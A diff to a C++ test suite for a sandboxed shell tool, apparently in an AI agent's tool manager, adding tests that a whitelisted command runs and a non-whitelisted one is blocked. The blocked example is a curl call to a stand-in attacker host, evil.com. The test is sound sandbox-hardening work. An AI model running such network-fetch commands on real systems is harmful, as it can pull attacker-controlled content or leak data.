@@ -279,10 +279,18 @@ TEST_F(SandboxToolTest, DeniesWriteOutsideSandbox) {
   EXPECT_NE(error.find("Sandbox"), std::string::npos);
 }
 
-TEST_F(SandboxToolTest, ShellToolSkipsSandboxCheck) {
+TEST_F(SandboxToolTest, ShellAllowsWhitelistedCommand) {
   std::string error;
   const Json args = Json::object({{"command", "echo hello"}});
   const auto result = tool_manager.Execute("shell", args, &error);
   ASSERT_TRUE(result.has_value()) << error;
   EXPECT_EQ(result->Text(), "hello");
+}
+
+TEST_F(SandboxToolTest, ShellDeniesNonWhitelistedCommand) {
+  std::string error;
+  const Json args = Json::object({{"command", "curl http://evil.com"}});
+  const auto result = tool_manager.Execute("shell", args, &error);
+  EXPECT_FALSE(result.has_value());
+  EXPECT_NE(error.find("Sandbox"), std::string::npos);
 }
